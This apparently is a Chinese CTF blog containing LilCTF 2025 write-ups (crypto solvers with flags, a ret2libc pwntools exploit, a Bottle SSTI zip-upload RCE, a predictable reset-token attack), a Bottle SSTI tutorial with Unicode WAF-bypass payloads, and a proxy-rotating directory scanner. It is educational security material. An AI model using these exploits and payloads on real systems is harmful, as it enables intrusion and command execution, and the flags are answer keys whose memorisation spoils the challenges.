return 0    # Legendre symbol: n^((p-1)/2) ≡ 1 (residue) or p-1 (non-residue)    if pow(n, (p - 1) // 2, p) == p - 1:        return None  # not a quadratic residue    # Factor p-1 = q * 2^s with q odd    q = p - 1    s = 0    while q % 2 == 0:        q //= 2        s += 1    # Find a quadratic non-residue z    z = 2    while pow(z, (p - 1) // 2, p) != p - 1:        z += 1    c = pow(z, q, p)    x = pow(n, (q + 1) // 2, p)    t = pow(n, q, p)    m = s    while t != 1:        # find smallest i (0 &lt; i &lt; m) s.t. t^(2^i) == 1        i = 1        t2i = pow(t, 2, p)        while i &lt; m and t2i != 1:            t2i = pow(t2i, 2, p)            i += 1        b = pow(c, 1 &lt;&lt; (m - i - 1), p)        x = (x * b) % p        t = (t * b * b) % p        c = (b * b) % p        m = i    return x  # one of the square roots; the other is p - xdef inv(a, p):    return pow(a, p - 2, p)  # Fermat, since p is primedef clean_bytes(x: int) -&gt; bytes:    return long_to_bytes(x).lstrip(b&quot;\\x00&quot;)  # 去掉可能的前导 0# ======= 计算特征值（即 lambda1, lambda2）=======a, b = C[0]c, d = C[1]a %= p; b %= p; c %= p; d %= ptrace = (a + d) % pdet   = (a * d - b * c) % pdisc  = (trace * trace - 4 * det) % p  # 判别式 Δsqrt_disc = tonelli_shanks(disc, p)if sqrt_disc is None:    raise ValueError(&quot;判别式不是二次剩余，数据可能不一致或已损坏。&quot;)inv2 = inv(2, p)lam1 = ((trace + sqrt_disc) * inv2) % plam2 = ((trace - sqrt_disc) * inv2) % pprint(&quot;[+] lambda1 =&quot;, lam1)print(&quot;[+] lambda2 =&quot;, lam2)# ======= 尝试复原明文字节并给出候选 flag =======half1 = clean_bytes(lam1)half2 = clean_bytes(lam2)candidates = [    (half1 + half2, &quot;λ1 || λ2&quot;),    (half2 + half1, &quot;λ2 || λ1&quot;),]KNOWN_PREFIX = b&quot;LILCTF&#123;&quot;KNOWN_SUFFIX = b&quot;&#125;&quot;for body, desc in candidates:    print(f&quot;\\n[+] Candidate (&#123;desc&#125;)&quot;)    print(&quot;    body bytes (hex):&quot;, body.hex())    try:        print(&quot;    body utf-8     :&quot;, body.decode(&quot;utf-8&quot;))    except UnicodeDecodeError:        print(&quot;    body utf-8     : &lt;decode failed&gt;&quot;)    flag_bytes = KNOWN_PREFIX + body + KNOWN_SUFFIX    print(&quot;    flag bytes(hex):&quot;, flag_bytes.hex())    try:        print(&quot;    FLAG (utf-8)   :&quot;, flag_bytes.decode(&quot;utf-8&quot;))    except UnicodeDecodeError:        print(&quot;    FLAG (utf-8)   : &lt;decode failed&gt;&quot;)\n\nLILCTF{It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5}\nmid_mathfrom sage.all import *from Crypto.Util.number import *from tqdm import tqdmfrom random import randintfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padflag = b&#x27;LILCTF&#123;test_flag&#125;&#x27;p = getPrime(64)P = GF(p)key = randint(2**62, p)def mul(vector, c):    return [vector[0]*c, vector[1]*c, vector[2]*c, vector[3]*c, vector[4]*c]v1 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]v2 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]v3 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]v4 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]v5 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]a, b, c, d, e = getPrime(64), getPrime(64), getPrime(64), getPrime(64),  0A = matrix(P, [v1, v2, v3, v4, v5])B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)])C = A.inverse() * BD = C**keykey = pad(long_to_bytes(key), 16)aes = AES.new(key,AES.MODE_ECB)msg = aes.encrypt(pad(flag, 64))print(f&quot;p = &#123;p&#125;&quot;)print(f&#x27;C = &#123;[i for i in C]&#125;&#x27;.replace(&#x27;(&#x27;, &#x27;[&#x27;).replace(&#x27;)&#x27;, &#x27;]&#x27;))print(f&#x27;D = &#123;[i for i in D]&#125;&#x27;.replace(&#x27;(&#x27;, &#x27;[&#x27;).replace(&#x27;)&#x27;, &#x27;]&#x27;))print(f&quot;msg = &#123;msg&#125;&quot;)#p = 14668080038311483271#C = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212], [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914], [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670], [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413], [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]#D = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044], [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372], [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427], [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551], [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]#msg = b&quot;\\xcc]B:\\xe8\\xbc\\x91\\xe2\\x93\\xaa\\x88\\x17\\xc4\\xe5\\x97\\x87@\\x0fd\\xb5p\\x81\\x1e\\x98,Z\\xe1n`\\xaf\\xe0%:\\xb7\\x8aD\\x03\\xd2Wu5\\xcd\\xc4#m&#x27;\\xa7\\xa4\\x80\\x0b\\xf7\\xda8\\x1b\\x82k#\\xc1gP\\xbd/\\xb5j&quot;\n\nexp:\n先用这个脚本跑出aes的key，但是flag是乱码，是因为把 AES 密钥用「补零」填充了，但出题脚本是用 pad(long_to_bytes(key), 16)（也就是 PKCS#7）去填充 AES key 的。把 AES key 按 PKCS#7 填充后再解密就能得到正确明文（然后对明文再用 blocksize&#x3D;64 的 PKCS#7 去掉 padding）\n# solve.py  -- pure Python exp (no Sage)import mathfrom collections import Counterfrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesfrom Crypto.Util.Padding import unpadimport sympy as sp# --------------------- paste instance data here ---------------------p = 14668080038311483271C = [    [11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212],    [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914],    [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670],    [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413],    [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707],]D = [    [1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044],    [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372],    [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427],    [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551],    [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395],]msg = b&quot;\\xcc]B:\\xe8\\xbc\\x91\\xe2\\x93\\xaa\\x88\\x17\\xc4\\xe5\\x97\\x87@\\x0fd\\xb5p\\x81\\x1e\\x98,Z\\xe1n`\\xaf\\xe0%:\\xb7\\x8aD\\x03\\xd2Wu5\\xcd\\xc4#m&#x27;\\xa7\\xa4\\x80\\x0b\\xf7\\xda8\\x1b\\x82k#\\xc1gP\\xbd/\\xb5j&quot;# -------------------------------------------------------------------def mat_eigs_modp(M_list, p):    &quot;&quot;&quot;Return eigenvalues of integer matrix modulo p (with multiplicity).&quot;&quot;&quot;    M = sp.Matrix([[x % p for x in row] for row in M_list])    lam = sp.symbols(&#x27;lam&#x27;)    # charpoly over ZZ then reduce mod p to avoid Mod-wrapping headaches    cpZZ = sp.Poly(M.charpoly(lam).as_expr(), lam, domain=&#x27;ZZ&#x27;)    coeffs = [int(c) % p for c in cpZZ.all_coeffs()]    poly_mod = sp.Poly(        sum(coeffs[i] * lam ** (len(coeffs) - 1 - i) for i in range(len(coeffs))),        lam, modulus=p    )    # factor over F_p    _, factors = poly_mod.factor_list()    eigs = []    for fac, mult in factors:        # fac is (lam - alpha) or lam + beta, all linear over F_p for our instance        if fac.degree() != 1:            # Fallback: numerically find roots over F_p (rare)            # Try brute over small deg - should not happen for 5x5 here            raise ValueError(&quot;Nonlinear factor appeared; adjust routine.&quot;)        # root of a*lam + b ≡ 0 =&gt; lam ≡ -b * a^&#123;-1&#125;        a = fac.all_coeffs()[0] % p        b = fac.all_coeffs()[1] % p        root = (-b * pow(a, -1, p)) % p        eigs.extend([root] * mult)    return eigsdef crt(remainders, moduli):    &quot;&quot;&quot;Chinese remainder theorem, pairwise coprime moduli.&quot;&quot;&quot;    x, M = 0, 1    for (r, m) in zip(remainders, moduli):        # solve x ≡ r (mod m) and x ≡ x (mod M)        # -&gt; find t: M*t ≡ (r - x) (mod m)        t = ((r - x) * pow(M, -1, m)) % m        x += M * t        M *= m    return x % M, Mdef baby_step_giant_step(g, h, p, order):    &quot;&quot;&quot;Solve g^x = h in subgroup of order &#x27;order&#x27; ⊂ F_p^* using BSGS.&quot;&quot;&quot;    m = int(math.isqrt(order)) + 1    # baby steps: g^0..g^&#123;m-1&#125;    table = &#123;&#125;    e = 1    for j in range(m):        table.setdefault(e, j)        e = (e * g) % p    g_inv_m = pow(pow(g, m, p), -1, p)    gamma = h    for i in range(m + 1):        if gamma in table:            return (i * m + table[gamma]) % order        gamma = (gamma * g_inv_m) % p    raise ValueError(&quot;log not found (inconsistent inputs)&quot;)def discrete_log_pohlig_hellman(g, h, p):    &quot;&quot;&quot;Return x s.t. g^x = h mod p, using PH over factors of p-1.&quot;&quot;&quot;    n = p - 1    # factorization of n (64-bit here; sympy is fine). If too slow for you, replace with Pollard-Rho.    fac = sp.factorint(n)  # &#123;q: e&#125;    residues = []    moduli = []    for q, e in fac.items():        q_pow = q ** e        # Work in subgroup of order q_pow        # Set g1 = g^&#123;n/q_pow&#125;, h1 = h^&#123;n/q_pow&#125;        g1 = pow(g, n // q_pow, p)        h1 = pow(h, n // q_pow, p)        # Solve for x modulo q_pow by lifting (standard PH lifting)        x_qe = 0        g_inv = pow(g1, -1, p)        for k in range(e):            # Compute c_k = h1 * (g1^&#123;-x_qe&#125;)^&#123;1&#125;  then raise to (q^&#123;e-1-k&#125;)            c = (h1 * pow(g_inv, x_qe, p)) % p            # exponent to collapse to order q            exp = pow(q, e - 1 - k)            c_k = pow(c, exp, p)            g_k = pow(g1, exp, p)            d = baby_step_giant_step(g_k, c_k, p, q)  # in subgroup of order q            x_qe = x_qe + d * pow(q, k)        residues.append(x_qe)        moduli.append(q_pow)    x, _ = crt(residues, moduli)    return x % ndef recover_key_from_eigs(p, eigC, eigD):    &quot;&quot;&quot;Try all pairings; return the consistent key (mod p-1).&quot;&quot;&quot;    nonzeroC = [x for x in eigC if x % p != 0]    nonzeroD = [x for x in eigD if x % p != 0]    candidates = []    for lam in nonzeroC:        for mu in nonzeroD:            # same subgroup check            if mu == 1 and lam == 1:                candidates.append(0)                continue            try:                k = discrete_log_pohlig_hellman(lam % p, mu % p, p)            except Exception:                continue            candidates.append(k)    if not candidates:        raise RuntimeError(&quot;No candidate keys found.&quot;)    # pick the most frequent k (they应当一致)    k, _ = Counter(candidates).most_common(1)[0]    return kdef main():    eigC = mat_eigs_modp(C, p)    eigD = mat_eigs_modp(D, p)    # print(&quot;eigC =&quot;, eigC)    # print(&quot;eigD =&quot;, eigD)    key_mod = recover_key_from_eigs(p, eigC, eigD)    # key is in [2^62, p), 但我们只需要与 p-1 同余，即用于 AES 不影响（原题直接 pad(long_to_bytes(key),16)）    key_bytes = long_to_bytes(key_mod)    # pad 至 16 的倍数与出题脚本一致    padlen = (16 - (len(key_bytes) % 16)) % 16    if padlen:        key_bytes = key_bytes + b&quot;\\x00&quot; * padlen    aes = AES.new(key_bytes, AES.MODE_ECB)    pt = aes.decrypt(msg)    # 原题对 flag 做了 pad(flag, 64)    try:        flag = unpad(pt, 64)    except ValueError:        # 如果出题脚本用了固定 blocksize=64 的 pad，这里尝试手动剥离        # 简单兜底：去掉末尾整块的 PKCS#7（若失败就直接打印原文）        try:            flag = unpad(pt, 16)        except ValueError:            flag = pt    print(&quot;[+] key (mod p-1) =&quot;, key_mod)    print(&quot;[+] AES key bytes (padded) =&quot;, key_bytes)    print(&quot;[+] flag =&quot;, flag)if __name__ == &quot;__main__&quot;:    main()\n然后再用这个脚本，套上上面的key就好\n# 修正：正确用 PKCS#7 pad(key_bytes, 16) 作为 AES keyimport mathfrom collections import Counterfrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesfrom Crypto.Util.Padding import unpad, padimport sympy as spfrom tqdm import tqdmp = 14668080038311483271# 省略 C, D, msg 定义（与你之前的一样）C = [    [11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212],    [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914],    [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670],    [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413],    [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707],]D = [    [1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044],    [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372],    [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427],    [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551],    [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395],]msg = b&quot;\\xcc]B:\\xe8\\xbc\\x91\\xe2\\x93\\xaa\\x88\\x17\\xc4\\xe5\\x97\\x87@\\x0fd\\xb5p\\x81\\x1e\\x98,Z\\xe1n`\\xaf\\xe0%:\\xb7\\x8aD\\x03\\xd2Wu5\\xcd\\xc4#m&#x27;\\xa7\\xa4\\x80\\x0b\\xf7\\xda8\\x1b\\x82k#\\xc1gP\\xbd/\\xb5j&quot;# （省略前面求特征值、PH、BSGS 的函数 —— 和之前脚本一致）# 你可以继续沿用之前的 mat_eigs_modp()、discrete_log_pohlig_hellman()、recover_key() 等函数# 假设我们已得到了 key_mod（即之前你打印出来的 5273966641785501202）key_mod = 5273966641785501202  # 由你先前输出得到def try_keys_and_decrypt(key_candidate_int):    # 出题脚本用 pad(long_to_bytes(key), 16) 作为 AES key    kb = long_to_bytes(key_candidate_int)    aes_key = pad(kb, 16)  # &lt;-- 关键改动：用 PKCS#7 填充到 16 字节边界    aes = AES.new(aes_key, AES.MODE_ECB)    pt = aes.decrypt(msg)    # 题里对 flag 做了 pad(flag, 64) —— 所以这里用 blocksize=64 去 unpad    try:        plain = unpad(pt, 64)        return plain    except ValueError:        return None# 直接试 key_mod（通常就是正确的，因为 key 原本在 [2**62, p)）res = try_keys_and_decrypt(key_mod)if res:    print(&quot;[+] success with key_mod -&gt;&quot;, res)else:    # 如果不成功，尝试 key_mod + t*(p-1) 在允许范围内的候选（理论上 key &lt; p）    found = None    step = p - 1    # 只需要尝试很少几个 t，因原 key 位于 [2**62, p)    for t in range(0, 3):        candidate = key_mod + t * step        if candidate &gt;= 2**62 and candidate &lt; p:            res = try_keys_and_decrypt(candidate)            if res:                found = (candidate, res)                break    if found:        print(&quot;[+] found by adding multiple of (p-1):&quot;, found)    else:        print(&quot;[-] decrypt failed for tested candidates. 可能需要检查 key 恢复步骤。&quot;)\n\n这时候就有屏幕前的家人问了，主播主播，你为什么不把两个脚本合并起来呢，因为我也不知道为什么合并起来就 MemoryError 了，于是只能作罢，反正题做出来了\nLILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}\nPWN签到打ret2libc，通过拼接 puts_plt(puts_got) 打印出puts函数的真实地址，泄露 libc 库的偏移量。 然后通过给定的 libc 库，计算出出目标的 system 地址和 “&#x2F;bin&#x2F;sh” 地址， 最后拼接 systme(“&#x2F;bin&#x2F;sh”) 完成 getshell\n理论是这样的，但是作为一个根本没学过 pwn 的菜鸡来说，还是太吃操作了，所以就不贴我的错误 exp 了，找了个大佬的 exp 来，说实话比我写的简洁多了，不愧是大佬\nfrom pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)port = remote(&quot;challenge.xinshi.fun&quot;,41148)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main = 0x401178pop_rdi = 0x0000000000401176ret  = 0x000000000040101asuccess(&quot;puts_plt ==&gt; &quot; + hex(puts_plt) + &#x27;\\n&#x27; + &quot;pust_got ==&gt;&quot; + hex(puts_got) )payload_test = b&#x27;a&#x27;*0x70 + b&#x27;a&#x27;*0x8 + p64(ret) +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)port.sendafter(b&quot;What&#x27;s your name?&quot;, payload_test)address = u64(port.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&quot;address ==&gt; &quot; + hex(address))base = address - libc.symbols[&quot;puts&quot;]success(&quot;base ==&gt;&quot; + hex(base))system = base + libc.symbols[&quot;system&quot;]sh_str = base + libc.search(&quot;/bin/sh\\x00&quot;).__next__()success(&quot;system ==&gt; &quot; + hex(system) + &#x27;\\n&#x27; + &quot;sh_str ==&gt;&quot; + hex(sh_str) )payload = b&#x27;a&#x27;*0x70 + b&#x27;a&#x27;*0x8  +p64(pop_rdi) + p64(sh_str) + p64(system) + p64(main)port.send(payload)port.interactive()\n\nWEBez_bottlebottle 居然不是 LamentXU 大佬来出还是有点出乎意料的\npython SSTI，过滤很阴，但是没有过滤 % \nreturn template(content) 模板会渲染解压后的内容\n不知道为什么没有回显，可以走 static 出回显\nexp：\nimport requestsimport zipfileimport iofcontent = f&quot;%import sys;sys.modules[&#x27;ciallo&#x27;]=sys.modules[&#x27;\\\\x6fs&#x27;];import ciallo;ciallo.system(&#x27;cat /flag \\\\x3e static/a.txt&#x27;)&quot;zfio = io.BytesIO()zf = zipfile.ZipFile(zfio, &#x27;w&#x27;)zf.writestr(&#x27;ciallo.txt&#x27;, fcontent)zf.close()TARGET=&quot;http://challenge.xinshi.fun:41479&quot;# 上传 zipresp = requests.post(f&quot;&#123;TARGET&#125;/upload&quot;, files=&#123;&#x27;file&#x27;: (&#x27;ciallo.zip&#x27;, zfio.getvalue())&#125;)print(resp.text)# 访问 txt 文件visit_path = resp.text.splitlines()[1][4:]resp = requests.get(f&quot;&#123;TARGET&#125;&#123;visit_path&#125;&quot;)print(resp.text)# 读取 flagresp = requests.get(f&quot;&#123;TARGET&#125;/static/a.txt&quot;)print(resp.text)\n\nEkko note比赛之前有翻过 LamentXU 大佬的文章，有一篇就是 uuid8，根据这个我们可以知道这道题的版本是 3.13+\n# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。# 反正整个程序没有一个地方用到random库。应该没有什么问题。import randomrandom.seed(SERVER_START_TIME)\n源码中给两段这个那就肯定要利用这个\n@app.route(&#x27;/server_info&#x27;)@login_requireddef server_info():    return &#123;        &#x27;server_start_time&#x27;: SERVER_START_TIME,        &#x27;current_time&#x27;: time.time()    &#125;\n\nif user:    # 选哪个UUID版本好呢，好头疼 &gt;_&lt;    # UUID v8吧，看起来版本比较新    token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧    reset_token = PasswordResetToken(user_id=user.id, token=token)    db.session.add(reset_token)    db.session.commit()\n\ntoken 值可获取，就是个 random 伪随机\n这里我们用 3.13.5 的环境去执行获取 token 的值\nimport uuidimport randomrandom.seed(1755241270.5513663)def padding(input_string):    byte_string = input_string.encode(&#x27;utf-8&#x27;)    if len(byte_string) &gt; 6: byte_string = byte_string[:6]    padded_byte_string = byte_string.ljust(6, b&#x27;\\x00&#x27;)    padded_int = int.from_bytes(padded_byte_string, byteorder=&#x27;big&#x27;)    return padded_inttoken = str(uuid.uuid8(a=padding(&quot;admin&quot;)))print(token)61646d69-6e00-8483-8219-c921bd0a5eb8\n重置 admin 的密码，然后登录进去，进入管理员界面会显示 2066 年后才能用，那我们直接改个timeapi，在2066年之后就好\n监听静态⽂件\npython3 -m http.server 20000\n修改timeapi服务器为 http://test.xxxx.com:20000/time.json\n然后执⾏命令cat flag\n","tags":["CTF"]},{"title":"Python Bottle SSTI","url":"/2025/08/21/Python-Bottle-SSTI/","content":"XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了\n\nBottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。\n主要特点\n\n\n特点\n说明\n\n\n\n单文件\n框架代码就是一个 bottle.py 文件，方便直接打包或拷贝\n\n\n零依赖\n除了 Python 标准库外不需要额外安装其它库\n\n\n内置开发服务器\n用 run() 就能启动 HTTP 服务\n\n\n支持多模板引擎\n默认内置 SimpleTemplate，也支持 Jinja2、Mako 等\n\n\n路由简洁\n使用装饰器 @route() 定义 URL 对应的处理函数\n\n\nWSGI兼容\n可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署\n\n\n内置常用工具\n请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等\n\n\n基本结构示例from bottle import route, run@route(&#x27;/&#x27;)def hello():    return &quot;Hello Bottle!&quot;run(host=&#x27;localhost&#x27;, port=8080, debug=True)\n\n执行后访问 http://localhost:8080 就能看到页面内容啦 (≧▽≦)\n常见功能\n路由映射：@route(&#39;/path&#39;) 定义 URL 和处理函数\nURL 参数：\n\n@route(&#x27;/user/&lt;name&gt;&#x27;)def greet(name):    return f&quot;Hello &#123;name&#125;!&quot;\n\n\n静态文件：static_file(filename, root=&#39;/path&#39;)\n表单与请求数据：\n\nfrom bottle import requestname = request.forms.get(&#x27;name&#x27;)\n\n\n模板渲染：\n\nfrom bottle import templatereturn template(&#x27;Hello &#123;&#123;name&#125;&#125;!&#x27;, name=&#x27;学长&#x27;)\n\n\nJSON 输出：直接 return &#123;&#39;key&#39;: &#39;value&#39;&#125; 会自动转成 JSON\n\n基于 Bottle 库的 SSTI 注入产生原因Bottle 默认的模板引擎是 SimpleTemplate（扩展名 .tpl），语法类似 Python 表达式，如果开发者直接把用户输入拼进模板字符串里渲染，就会导致 SSTI（Server-Side Template Injection）\n危险示例from bottle import route, run, request, template@route(&#x27;/&#x27;)def vuln():    user_input = request.query.get(&#x27;tpl&#x27;, &#x27;guest&#x27;)    return template(user_input)  # 直接渲染用户输入run(host=&#x27;0.0.0.0&#x27;, port=8080)\n\n利用：\nhttp://127.0.0.1:8080/?tpl=&#123;&#123;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;\n\n有一个博客说是不止&#123;&#123;&#125;&#125;可以用来 SSTI\n\n虽说&#123;&#123; &#125;&#125;是唯一默认语法，但是我看到一篇博客说&lt;%%&gt;和%也可以使用，但是我自己实测下来发现就%可以使用（我猜测跟bottle.template()有关系跟进代码去看了一下检测 \\n、&#123;、%、$ 字符自动判断输入类型但是没有&lt;%%&gt;所以我感觉挺奇怪的估计跟版本问题有关系，实际做题时如果&#123;&#123;&#125;&#125;被禁用了可以尝试看看）\n\n漏洞利用和 flask 框架下的 SSTI 其实差不多，就不列举了\n\n以上都是无关紧要的前置知识，接下来就是一些有意思的新东西了\nbottle框架中由斜体字引发的模板注入（SSTI）waf bypass参考自https://www.cnblogs.com/LAMENTXU/articles/18805019\n斜体字符集斜体字符集指的是Decomposition后为同一个字符的字符集\n用https://www.compart.com/en/unicode/ 可以查看的到字符集（这里用a来做示例）\n\n这些字符分解后都指向a，例如：á (U+00E1)分解为a(U+0065)+´(U+0301)，á分解后指向a\n这些字符共同组成了a这个基础字符的斜体字符集。\n具体原理我们就先不管了，注意一下这里的字符集并不是所有的都可用\n\n这是因为沟槽的URL编码。这些特殊字符经过URL编码之后一个字符都必须以两个编码值表示。但是bottle在解析编码值的时候是按照一个编码值对应一个字符进行解析的。所以往往一个这些字符都会被识别成两个字符。到目前为止我还没找到一种能把斜体字符从前端传到后端的解决办法（哭）。我目前测试成功的只有位于U+0080（**&lt;Padding Character&gt; (PAD)**）-U+00BF（**¿**）区间的字符，也就是Latin-1 Supplement的一半，不难发现他们的URL编码都由%c2开头，后面再跟一个编码值。利用的时候只需要将开头的%c2删去就可以成功将原字符传入后端。其中只有**ª** (U+00AA)，**º** (U+00BA)，**¹** (U+00B9)，**²** (U+00B2)，**³** (U+00B3)有用，其中**¹** (U+00B9)，**²** (U+00B2)，**³** (U+00B3)在**exec()**时不会被python正确解析。而**ª** (U+00AA)，**º** (U+00BA)执行的时候等效于字符**a**,**o**，别的字符RCE根本用不上。\n\n这个问题大大的限制了这种利用方式，但是我们也不难推知，以下payload成立：\nreturn bottle.template(&#x27;&#123;&#123;𝒶𝒷𝓈(-1)&#125;&#125;&#x27;)\n\n因此我们所有的问题都聚焦在如何将斜体字符传入template中，因为get（post）传参特殊字符必须进行URL编码的原因，我们无法传入这种斜体字符。但是假设靶机提供了一种可以不使用URL编码的方式将可控输入传入template（如：上传文件，再渲染文件中的内容形成的SSTI）那就意味着所有的字符可以全部用各种斜体替换\n就例如刚刚结束的 LilCTF2025，里面那道题理论上就可以用斜体字绕过过滤（不过我没试）\n","tags":["web安全"]},{"title":"Python多线程","url":"/2025/10/26/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/","content":"首先我们要了解一点基础知识\n线程与进程进程（Process）进程是操作系统中资源分配的最小单位，简单来说，一个进程就是一个正在运行的程序的实例，操作系统会为每个进程分配独立的内存空间、文件句柄、CPU 时间、网络端口等资源。不同的进程之间相互独立，一个进程崩了不会影响另一个进程\n在 Python 中，一个multiprocessing.Process() 启动的任务就是一个新的子进程，它拥有独立的 Python 解释器和内存空间\n线程（Thread）线程是进程中的执行单元，是操作系统中能进行调度的最小单位\n一个进程可以有多个线程，多个线程共享同一个进程的内存和资源，每个线程只负责执行一部分任务。\n 在 Python 里，threading.Thread() 或 ThreadPoolExecutor() 启动的就是线程\nPython 中的区别和限制Python 中有一个叫 GIL（全局解释器锁） 的机制，这个机制让同一时刻只能有一个线程在执行 Python 字节码，所以对于 CPU 密集型任务，多线程的效果并不大，但是对于 I&#x2F;O 密集型任务（网络请求、文件操作等），多线程仍能提高效率。\n因此如果是网络扫描、爬虫就用多线程，而如果是数据计算、加密、视频渲染则用多进程\n示例import requestsimport concurrent.futuresimport queueimport random# 获取 URLurl = input(&quot;请输入 URL：&quot;).strip()headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;&#125;print(&quot;Ciallo～ (∠・ω&lt; )⌒★&quot;)# 代理池（可以自己添加更多代理）proxy_pool = [    &quot;http://123.456.789.1:8080&quot;,    &quot;http://234.567.890.2:8080&quot;,    &quot;http://345.678.901.3:8080&quot;,    &quot;http://456.789.012.4:8080&quot;,]def read_file(file1):    &quot;&quot;&quot;尝试以 UTF-8 读取文件，失败后尝试 GBK&quot;&quot;&quot;    try:        with open(file1, encoding=&#x27;utf-8&#x27;) as f:            return f.readlines()    except UnicodeDecodeError:        with open(file1, encoding=&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;) as f:            return f.readlines()def get_random_proxy():    &quot;&quot;&quot;随机获取一个代理&quot;&quot;&quot;    return random.choice(proxy_pool)def scan_path(path):    &quot;&quot;&quot;扫描单个路径&quot;&quot;&quot;    full_url = url.rstrip(&quot;/&quot;) + &quot;/&quot; + path.strip()  # 拼接完整 URL    proxy = get_random_proxy()  # 随机选一个代理    proxies = &#123;&quot;http&quot;: proxy, &quot;https&quot;: proxy&#125;  # 设置代理    try:        response = requests.get(full_url, headers=headers, proxies=proxies, timeout=5)  # 发送请求        if response.status_code == 200:            red_text = f&quot;\\033[91m[+] &#123;path.strip()&#125; 存在 (代理: &#123;proxy&#125;)\\033[0m&quot;  # 红色高亮            print(red_text)            return f&quot;[+] &#123;path.strip()&#125; 存在 (代理: &#123;proxy&#125;)&quot;  # 返回结果        else:            print(f&quot;[-] &#123;path.strip()&#125; 不存在 (代理: &#123;proxy&#125;)&quot;)  # 打印但不保存    except requests.exceptions.RequestException as e:        print(f&quot;[!] 访问 &#123;full_url&#125; 失败 (代理: &#123;proxy&#125;): &#123;e&#125;&quot;)  # 处理错误    return None  # 失败返回 Nonedef run():    &quot;&quot;&quot;使用多线程执行扫描&quot;&quot;&quot;    paths = read_file(&quot;PHP.txt&quot;)  # 读取字典文件    results = []    q = queue.Queue()  # 任务队列    for path in paths:        q.put(path.strip())  # 加入队列    # 设置最大线程数    max_threads = 10  # 线程池大小（可调整）    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:        # 提交所有任务        future_to_path = &#123;executor.submit(scan_path, q.get()): path for path in paths&#125;        for future in concurrent.futures.as_completed(future_to_path):            result = future.result()            if result:                results.append(result)    return &quot;\\n&quot;.join(results)# 执行扫描并保存结果with open(&quot;output.txt&quot;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:    result = run()    if result:        f.write(result)\n\n这是一个用 ai 